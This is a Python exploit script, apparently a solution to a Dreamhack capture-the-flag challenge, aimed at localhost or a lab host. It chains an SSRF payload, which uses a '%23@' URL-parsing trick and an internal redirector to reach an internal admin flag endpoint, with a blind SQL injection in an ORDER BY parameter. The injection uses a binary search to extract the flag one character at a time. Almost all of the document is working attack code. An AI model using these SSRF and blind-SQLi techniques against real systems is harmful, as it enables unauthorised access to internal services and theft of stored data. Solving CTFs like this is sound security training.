import requests
import time

TARGET_URL = "http://localhost:8080"    
# TARGET_URL = "http://host8.dreamhack.games:8634"
target_payload = "http://internalapi:8081/admin/flag"
ssrf_payload = f"http://example.com%23@redirector:8081/redir?to={target_payload}"

print(f"[*] SSRF payload: {ssrf_payload}")

r = requests.post(f"{TARGET_URL}/fetch", data={'url': ssrf_payload})

if r.status_code != 200:
    print(f"[-] Error: {r.text}")
    exit()

job_id = r.json()['job_id']
print(f"[+] Job ID: {job_id}")
time.sleep(3) 
print("[*] Starting SQLi")

flag = ""
while not flag.endswith("}"):
    low = 32
    high = 126
    idx = len(flag)
    start = "instr(result, 'body_snippet=')"
    padding = len('body_snippet={"flag":"')

    while low <= high:
        mid = (low + high) // 2
        sql_condition = f"(SELECT unicode(substr(result, {start} + {idx+padding}, 1)) FROM jobs WHERE id='{job_id}') > {mid}"
        injection = f"id * (CASE WHEN {sql_condition} THEN 1 ELSE -1 END)"
        # Whole SQL command:
        # SELECT ev, job, info, t FROM audit 
        # ORDER BY id * (CASE WHEN
            #   (
            #       SELECT UNICODE(SUBSTR(result, INSTR(result, 'body_snippet=') + 13 + <index>, 1))
            #       FROM jobs WHERE id = '<JOB_ID>'
            #   ) > <ASCII_NUMBER>
        #   THEN 1 ELSE -1 END
        # ) 
        # DESC LIMIT 80
        audit_r = requests.get(f"{TARGET_URL}/audit", params={'order': injection})
        data = audit_r.json()
        t_first = data[0]['t']
        t_last = data[-1]['t']
        if t_first < t_last:
            low = mid + 1
        else:
            high = mid - 1
            
    extracted_char = chr(low)
    flag += extracted_char
    print(f"\r[+] Flag: {flag}", end="\n", flush=True)

if flag.startswith("DH{"):
    print("\nFlag found")
else:
    print("\nNot found")